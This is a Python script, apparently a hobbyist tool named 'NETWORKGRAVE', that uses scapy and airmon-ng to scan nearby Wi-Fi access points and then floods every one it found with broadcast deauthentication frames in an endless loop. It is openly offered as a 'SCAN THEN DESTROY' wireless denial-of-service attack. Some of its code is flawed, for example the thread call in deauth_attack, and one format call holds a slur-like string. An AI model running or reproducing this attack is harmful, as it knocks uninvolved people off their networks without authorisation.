import os
import sys

#-----------------------------------------------------------------------------------------------------
#colors
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
purple = "\033[35m"
clear = "\033[00m"

#ap array
AP_BSSID = []
AP_SSID = []
AP_CH = []

APINFOLOG = "{c}{pa2}  {p}|{c}  {pi}  {p}"

channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]

#-----------------------------------------------------------------------------------------------------

from scapy.all import *
import subprocess

import time

import signal
from threading import Thread
       
#-----------------------------------------------------------------------------------------------------    

#startscreen
def startscreen():

    subprocess.call("clear", shell=True)

    print(menumessages[0])
    input("PRESS {b}[ENTER]{c}...\n".format(b=blue, c=clear))
    
    subprocess.call("clear", shell=True)

#-----------------------------------------------------------------------------------------------------

'''
THIS IS MENU AND FORMATTING
CODE.
'''
#to look coOoOl
menumessages = ['''
                      {p}:::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:       {b}NETWORKGRAVE{c}
              {p}!!~  ~:~!! :~!$!#$$$$$$$$$$8X:      ~~~~~~~~~~~~
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!      
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!      {p}SCAN{c} {b}THEN{c} {p}DESTROY{c}...
               {p}!:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!{c}      PRESS {b}[ENTER]{c} TO CONTINUE
             {p}:X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``                {p}s  k  u  l{c}
{p}?MXT@Wx.~    :     ~"##*$$$$M~  {c}        
    '''.format(b=blue, c=clear, p=purple, r=red)]

'''
THIS IS THE END OF MENU
AND FORMATTING CODE.
'''    

#-----------------------------------------------------------------------------------------------------  

'''
THIS IS THE CODE FOR 
THE SNIFFER FUNCTION
AND ALL OF ITS
RELATED AND NEEDED 
ATTRIBUTES + FUNCTIONS.
'''

#used for the entire chunk of sniffing, holds all below functions together in a nice orderly fashion

def mainsniffer():    
    print('''
        {b}NETWORK DEVICES SCANNED{c}
{p}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{c}
        {b}BSSID{c}     {p} |       {b}SSID{c}'''.format(b=blue, p=purple, c=clear))
       
    channel_hopping_sniffer()
    
#essentially main sniffing program that runs for one cycle capturing any packet across 11 channels, add 3 more to the channels array if you want a wider range, ive come to learn that 12 13 14 barely gets used so i did not include them. i want speed over potential

def channel_hopping_sniffer():
    global channels
    #sniffs ONE CYCLE on each channel from 1 to 11
    for channel in channels:
        #formatting thing to look good
        if channel < 10:
            print("{b}CHANNEL{p} ".format(b=blue, p=purple) + str(channel) + (" "*10) + "|{c}".format(c=clear))
        else:
            print("{b}CHANNEL{p} ".format(b=blue, p=purple) + str(channel) + (" "*9) + "|{c}".format(c=clear))
        
        sniff(iface="mon0", prn=pkt_callback, timeout=0.5)
        subprocess.check_output("iwconfig mon0 channel " + str(channel), shell=True)
        
    print("\n---------------------------------------\n{b}SCANNED {p}NETWORK{b} DEVICES: {c}{num}\n{b}ON {c}11 {p}CHANNELS{c}.\n---------------------------------------\n".format(num=str(len(AP_BSSID)), b=blue, c=clear, p=purple))
    
#function that basically determines what happens with captured packets, pretty readable i think

def pkt_callback(pkt):
    if pkt.haslayer(Dot11Elt):
        if pkt.addr2 not in AP_BSSID and pkt.info not in AP_SSID:
            AP_BSSID.append(pkt.addr2)
            AP_SSID.append(pkt.info)
            print(APINFOLOG.format(c=clear, p=purple, pa2=pkt.addr2, pi=pkt.info, chan="niga"))    

#turns on mon mode for wireless card, using airmon-ng. checklist: use iwconfig? na       
        
def monitormode():
    print("[{y}!{c}] ENABLING {b}MONITOR{c} MODE...".format(y=yellow,b=blue, c=clear))
    try:
        #pre-cleanup, dont @me this works amazing
        subprocess.check_output("airmon-ng stop mon0", shell=True)
        #activate monitor mode
        subprocess.check_output("airmon-ng start wlan0", shell=True)
        subprocess.check_output("airmon-ng stop wlan0", shell=True)
        
        print("[{g}+{c}] {b}MONITOR{c} MODE SUCCESSFULLY ENABLED!".format(g=green, b=blue, c=clear))
    except:
        exit("\n[{r}-{c}] ERROR: UNABLE TO ACTIVATE {b}MONITOR{c} MODE.".format(b=blue, r=red, c=clear))

#function for a cleanup. turns off mon mode and resets everything, makes it look nice as well with a flashy shutdown screen

def cleanup(): #after scanning and all, in order for mon mode to be deactivated and for a summary
    print("[{y}!{c}] DISABLING {b}MONITOR{c} MODE...".format(y=yellow,b=blue, c=clear))
    subprocess.check_output("airmon-ng check kill", shell=True)
    
    exit("[{b}LOG{p}OFF{c}]...".format(b=blue, p=purple, c=clear))

'''
THIS IS THE END OF
THE SNIFFER FUNCTION
AND ALL OF ITS
RELATED ATTRIBUTES +
FUNCTIONS.
'''
#-----------------------------------------------------------------------------------------------------
'''
ATTACKS
'''

#channel hopping func
def channelhopper():
    
    for channel in channels:
        subprocess.check_output("iwconfig mon0 channel " + str(channel), shell=True)
        time.sleep(0.2)

#not done yet, but planning to deauth all scanned ap bssids
def deauth_attack():
    BROADCAST = "FF:FF:FF:FF:FF:FF"
    verboselog = False
    is_verbose = input("VERBOSE? (y/n) ")
    
    if is_verbose == "y":
        verboselog=True

    input("BEGIN NETWORK DOS DEAUTH ATTACK?\nPRESS [ENTER]...")

    #starts channelhopper func as daemon to have packets consistently sent out across all channels
    chop = Thread(target=channelhopper(), args=[])
    chop.daemon = True
    chop.start()
    
    while True:    
        for bssid in AP_BSSID:
            pkt = RadioTap() / Dot11(addr1=BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(pkt, iface="mon0", count=10, verbose=False)
            if verboselog == True:
                print("packet sent to " + bssid)
#-----------------------------------------------------------------------------------------------------
#if run with python3
if __name__ == "__main__":
    #sudo priviliges
    if os.geteuid() != 0:
        exit("{r}Root required!{c}".format(r=red, c=clear))
    
    startscreen()
    monitormode()
    mainsniffer()
    deauth_attack()
